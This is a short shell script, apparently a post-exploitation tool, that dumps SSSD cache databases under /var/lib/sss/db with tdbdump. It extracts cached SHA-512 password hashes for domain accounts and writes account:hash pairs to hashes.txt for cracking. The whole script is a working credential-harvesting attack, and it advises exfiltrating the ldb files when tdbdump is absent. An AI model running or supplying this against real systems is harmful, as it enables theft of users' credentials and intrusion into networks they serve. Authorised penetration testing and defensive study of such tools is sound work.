if [ -z $1 ]; then
    location_=/var/lib/sss/db
else
	location_="$1"
fi

analyze=0

if which "tdbdump" >/dev/null; then
	analyze=1
else
	echo "tdbdump is not installed so it is not possible to analyze ldb files"
	echo "Exfiltrate ldb files to a system with tdbdump or install it (apt install tdb-tools)"
	echo ""
fi

for db_ in $(ls $location_/*ldb)
do
	echo ""
	if [ "$analyze" -eq "1" ]; then
		number_of_accounts=$(tdbdump $db_ | grep cachedPassword | cut -d "=" -f 3 | cut -d "," -f 1 | sort -u | wc -l)
		echo "\e[1;36m### $number_of_accounts hash found in $db_ ###\e[0m"
		for account_ in $(tdbdump $db_ | grep cachedPassword | cut -d "=" -f 3 | cut -d "," -f 1 | sort -u)
		do
			echo "\nAccount:	\e[1;32m$account_\e[0m"
			hash_=$(tdbdump $db_ | grep cachedPassword | grep $account_ | grep -o "\$6\$.*achedPassword" | awk -F 'Type' '{print $1}' | awk -F 'cachedPassword' '{print $1}' | awk -F 'lastCachedPassword' '{print $1}')
			echo "Hash:		\e[1;31m$hash_\e[0m"
			echo $account_:$hash_ >> hashes.txt
		done
		if [ "$number_of_accounts" -gt "0" ]; then
			echo "\n\e[1m  =====> Adding $db_ hashes to hashes.txt <=====\e[0m\n"
		fi
	fi
done
echo ""